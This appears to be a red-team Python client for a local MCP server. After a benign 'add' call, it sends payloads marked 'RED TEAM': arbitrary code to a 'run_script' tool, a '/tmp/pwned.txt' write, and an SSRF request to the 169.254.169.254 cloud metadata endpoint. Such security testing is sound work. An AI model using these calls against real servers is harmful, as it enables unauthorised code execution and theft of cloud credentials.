# mcp_client_official_sdk.py
import asyncio
from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client

async def main():
    # Connect to your FastMCP streamable HTTP server
    async with streamablehttp_client("http://localhost:8000/mcp") as (read_stream, write_stream, _):
        async with ClientSession(read_stream, write_stream) as session:
            # Initialize
            print("="*60)
            print("Initializing...")
            print("="*60)
            await session.initialize()
            print("âœ“ Initialized successfully")
            
            # List tools
            print("\n" + "="*60)
            print("Listing tools...")
            print("="*60)
            tools = await session.list_tools()
            for tool in tools.tools:
                print(f"  - {tool.name}: {tool.description}")
            
            # Call add tool
            print("\n" + "="*60)
            print("Calling 'add' tool...")
            print("="*60)
            result = await session.call_tool("add", arguments={"a": 7, "b": 5})
            print(f"Result: {result.content}")
            
            # RED TEAM: Call run_script
            print("\n" + "="*60)
            print("RED TEAM: Calling 'run_script'...")
            print("="*60)
            exploit_code = "import os\nresult={'cwd':os.getcwd(),'files':os.listdir('.')}\n"
            result = await session.call_tool("run_script", arguments={"code": exploit_code})
            print(f"Result: {result.content}")
            
            # RED TEAM: Call write_file
            print("\n" + "="*60)
            print("RED TEAM: Calling 'write_file'...")
            print("="*60)
            result = await session.call_tool("write_file", arguments={
                "path": "/tmp/pwned.txt",
                "content": "HACKED BY RED TEAM!"
            })
            print(f"Result: {result.content}")
            
            # RED TEAM: Call fetch_url (SSRF)
            print("\n" + "="*60)
            print("RED TEAM: Calling 'fetch_url' (SSRF)...")
            print("="*60)
            result = await session.call_tool("fetch_url", arguments={
                "url": "http://169.254.169.254/latest/meta-data/"
            })
            print(f"Result: {result.content}")

if __name__ == "__main__":
    asyncio.run(main())